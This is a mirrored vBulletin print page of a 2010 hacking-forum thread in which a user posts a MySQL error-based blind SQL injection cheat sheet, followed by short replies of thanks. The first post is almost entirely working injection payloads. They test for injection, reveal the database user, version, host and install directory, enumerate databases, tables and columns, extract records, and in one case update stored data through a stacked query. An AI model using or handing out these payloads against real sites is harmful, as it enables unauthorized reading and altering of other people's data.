@@ -1,0 +1,348 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=421&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:32:48 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+	<base  /><!--[if IE]></base><![endif]-->
+	<meta name="generator" content="vBulletin 4.2.1" />
+
+	
+	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	
+
+
+
+	<title> MySQL Blind SQL Cheat Sheets</title>
+	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+<body>
+
+<div class="above_body">
+<div id="header" class="floatcontainer">
+<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+</div>
+</div>
+<div class="body_wrapper">
+<div id="pagetitle">
+	<h1><a href="showthreadba83.html?t=421">MySQL Blind SQL Cheat Sheets</a></h1>
+	<p class="description">Printable View</p>
+</div>
+
+
+	<div class="floatcontainer">
+		<a class="maxperpage" href="printthreadd5f8.html?t=421&amp;pp=40">Show 40 post(s) from this thread on one page</a>
+		<div id="pagination_top">
+			<form action="../external.html?link=http://garage4hackers.com/printthread.php?t=421&amp;pp=10&amp;page=2" method="get" class="pagination popupmenu nohovermenu">
+<input type="hidden" name="t" value="421" /><input type="hidden" name="pp" value="10" />
+	
+		<span><a href="javascript://" class="popupctrl">Page 1 of 2</a></span>
+		
+		
+		
+		<span class="selected"><a href="javascript://" title="Results 1 to 10 of 11">1</a></span><span><a href="printthreadef82.html?t=421&amp;pp=10&amp;page=2" title="Show results 11 to 11 of 11">2</a></span>
+		
+		
+		<span class="prev_next"><a rel="next" href="printthreadef82.html?t=421&amp;pp=10&amp;page=2" title="Next Page - Results 11 to 11 of 11"><img src="images/pagination/next-right.html" alt="Next" /></a></span>
+		
+		
+		<span class="first_last"><a href="printthreadef82.html?t=421&amp;pp=10&amp;page=2" title="Last Page - Results 11 to 11 of 11">Last<img src="images/pagination/last-right.html" alt="Last" /></a></span>
+		
+	
+	<ul class="popupbody popuphover">
+		<li class="formsubmit jumptopage"><label>Jump to page: <input type="text" name="page" size="4" /></label> <input type="submit" class="button" value="Go" /></li>
+	</ul>
+</form>
+		</div>
+	</div>
+
+
+<ul id="postlist">
+	<li class="postbit blockbody" id="post_1">
+	<div class="header">
+		<div class="datetime">10-28-2010, 12:20 AM</div>
+		<span class="username">nishant</span>
+	</div>
+	
+	
+		<div class="title">MySQL Blind SQL Cheat Sheets</div>
+	
+	<div class="content">
+		<blockquote class="restore">This is nothing mind blowing but just thought of sharing with you guys. I'll be glad if it can be of any help to you. :)<br />
+<br />
+Quick &amp; Dirty MySQL (Error Based) Blind SQLi Cheat Sheet<br />
+<br />
+So, you have a web application vulnerable to Blind SQL Injection (test the param with single quote ' ) and you need dirty &amp; quick cheats to dig deeper.<br />
+<br />
+Note: The data is fetched using a Hex() and a type casting with the cast() to make the query reliable and avoid bad characters and format strings issue (for example 0x00 as the last byte of every data fetched.) These payloads heavily rely on the information_schema database. So if you don't get the desired result, it just means that the remote database server doesn't have it. <br />
+<br />
+<br />
+These payloads are only crafted for Error-based MySQL Blind SQL Injections using String type parameters. If you know what I'm talking about, go play!  <br />
+<br />
+No more crap, straight to the point.<br />
+<br />
+<br />
+<b>1. To test blind injection</b><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">' and 'x'='x</code><hr />
+</div><b>2. To select the current database (Output will be in Hexadecimal, decode to ASCII</b><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,Hex(cast(database() as char)),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><b>3. To find the current user</b><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,Hex(cast(user() as char)),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><b>4. To find MySQL Version</b><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,Hex(cast(version() as char)),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><b>5. Find current database</b><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,Hex(cast(database() as char)),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><b>6. To find the system user</b><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,Hex(cast(system_user() as char)),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><b>7. To find the hostname</b><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,Hex(cast(@@hostname as char)),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><b>8. To find the installation directory</b><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,Hex(cast(@@basedir as char)),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><b>9. To find the DB User</b><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,Hex(cast(GRANTEE as char)),0x27,0x7e) FROM information_schema.user_privileges LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><b>10. To find the databases</b><br />
+<i>Note: Keep incrementing the n, e.g. : n, n+1, n+2, ... till you keep getting a response.</i><br />
+<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,Hex(cast(GRANTEE as char)),0x27,0x7e) FROM information_schema.user_privileges LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,Hex(cast(schema_name as char)),0x27,0x7e) FROM information_schema.schemata LIMIT <i><b><u>n</u></b></i>,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,Hex(cast(schema_name as char)),0x27,0x7e) FROM information_schema.schemata LIMIT <i><u><b>n+1</b></u></i>,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><br />
+<b>11. To count the number of tables in the selected database</b><br />
+<i>Note: Note this count as n<br />
+Replace colored strings with appropriate value</i><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1' and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(table_name),0x27,0x7e) FROM `information_schema`.tables WHERE table_schema=0x<b><i><u>hex_code_of_database_name</u></i></b>)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><b>12. To get the table names in the selected database</b><br />
+<i>Note: m-n implies execute this query starting from m, m+1…n-1<br />
+Replace colored strings with appropriate value</i><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,Hex(cast(table_name as char)),0x27,0x7e) FROM information_schema.tables Where table_schema=0x<u><i><b>hex_code_of_database_name</b></i></u> limit m-n,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><b>13. To get number of columns in the selected table name</b><br />
+<i>Note: Note this count as n<br />
+Replace colored strings with appropriate value</i><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1' and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(column_name),0x27,0x7e) FROM `information_schema`.columns WHERE table_schema=0x<u><i><b>hex_code_of_database_name</b></i></u> AND table_name=0x<u><i><b>hex_code_of_table_name</b></i></u>)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><b>14. To get column names of a selected table name</b><br />
+<i>Note: m-n implies execute this query starting from m, m+1…n-1<br />
+Replace colored strings with appropriate value</i><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,Hex(cast(column_name as char)),0x27,0x7e) FROM information_schema.columns Where table_schema=0x<u><i><b>hex_code_of_database_name</b></i></u> AND table_name=0x<i><b><u>hex_code_of_table_name</u></b></i> limit <i><b><u>m-n</u></b></i>,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><b>15. To count the number of records in a selected column</b><br />
+<i>Note: Remember this count as n</i><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1' and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(*),0x27,0x7e) FROM `database_name`.table_name)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><b>16. To fetch records from a selected column</b><br />
+<i>Note: m-n implies execute this query starting from m, m+1…n-1<br />
+Replace colored strings with appropriate value</i><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1' and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,Hex(cast(table_name.column_name as char)),0x27,0x7e) FROM `database_name`.table_name LIMIT <i><u><b>m-n</b></u></i>,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1</code><hr />
+</div><b>17. Update a record in the selected column</b><br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">1';UPDATE table_name SET column_name=0x<u><i><b>hex_code_of_new_record_value</b></i></u> WHERE column_name=0x<u><i><b>hex_code_of_old_record_valu</b></i></u>e--</code><hr />
+</div>I will update the cheat sheets for other database servers too in separate posts. Keep watching. Till then take care and bye.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_2">
+	<div class="header">
+		<div class="datetime">10-28-2010, 12:39 AM</div>
+		<span class="username">fb1h2s</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Cool share nishant, I hven't tried out a blind injection so far, this cheet sheet will definitely  be of use, share more of these stuffs, thanks again :)</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_3">
+	<div class="header">
+		<div class="datetime">10-28-2010, 12:42 AM</div>
+		<span class="username">AnArKI</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">gud one TFS</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_4">
+	<div class="header">
+		<div class="datetime">10-28-2010, 10:25 AM</div>
+		<span class="username">41.w4r10r</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">nice cheat sheet.<br />
+<br />
+More expected... ;)</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_5">
+	<div class="header">
+		<div class="datetime">10-30-2010, 02:06 AM</div>
+		<span class="username">sh0bhit</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">meee toooo working on normal sql injection <br />
+<br />
+will look forward for blind sql later</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_6">
+	<div class="header">
+		<div class="datetime">11-26-2010, 04:02 AM</div>
+		<span class="username">[s]</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Floor Function here nice one Brother , like it !</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_7">
+	<div class="header">
+		<div class="datetime">07-11-2011, 08:09 PM</div>
+		<span class="username">us3r9</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">I only found Blind SQL injection on the website I have tested so far so this cheat sheet will be very useful..</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_8">
+	<div class="header">
+		<div class="datetime">12-09-2011, 04:59 PM</div>
+		<span class="username">wangzi</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">oh my  god  .. Good  sql injection Blind good tank you!!!!!</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_9">
+	<div class="header">
+		<div class="datetime">06-20-2012, 09:45 PM</div>
+		<span class="username">H@CK3R_ADI</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">very good share mate.......a valuable cheatsheet.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_10">
+	<div class="header">
+		<div class="datetime">01-23-2014, 01:18 PM</div>
+		<span class="username">cixin</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Floor Function here nice one Brother , like it !</blockquote>
+	</div>
+</li>
+</ul>
+
+
+	<div class="floatcontainer">
+		<a class="maxperpage" href="printthreadd5f8.html?t=421&amp;pp=40">Show 40 post(s) from this thread on one page</a>
+		<div id="pagination_bottom">
+			<form action="../external.html?link=http://garage4hackers.com/printthread.php?t=421&amp;pp=10&amp;page=2" method="get" class="pagination popupmenu nohovermenu">
+<input type="hidden" name="t" value="421" /><input type="hidden" name="pp" value="10" />
+	
+		<span><a href="javascript://" class="popupctrl">Page 1 of 2</a></span>
+		
+		
+		
+		<span class="selected"><a href="javascript://" title="Results 1 to 10 of 11">1</a></span><span><a href="printthreadef82.html?t=421&amp;pp=10&amp;page=2" title="Show results 11 to 11 of 11">2</a></span>
+		
+		
+		<span class="prev_next"><a rel="next" href="printthreadef82.html?t=421&amp;pp=10&amp;page=2" title="Next Page - Results 11 to 11 of 11"><img src="images/pagination/next-right.html" alt="Next" /></a></span>
+		
+		
+		<span class="first_last"><a href="printthreadef82.html?t=421&amp;pp=10&amp;page=2" title="Last Page - Results 11 to 11 of 11">Last<img src="images/pagination/last-right.html" alt="Last" /></a></span>
+		
+	
+	<ul class="popupbody popuphover">
+		<li class="formsubmit jumptopage"><label>Jump to page: <input type="text" name="page" size="4" /></label> <input type="submit" class="button" value="Go" /></li>
+	</ul>
+</form>
+		</div>
+	</div>
+
+</div>
+<div class="below_body">
+<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:07 PM</span>.</div>
+
+<div id="footer_copyright" class="footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+</div>
+ 
+</div>
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=421&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:32:48 GMT -->
+</html>
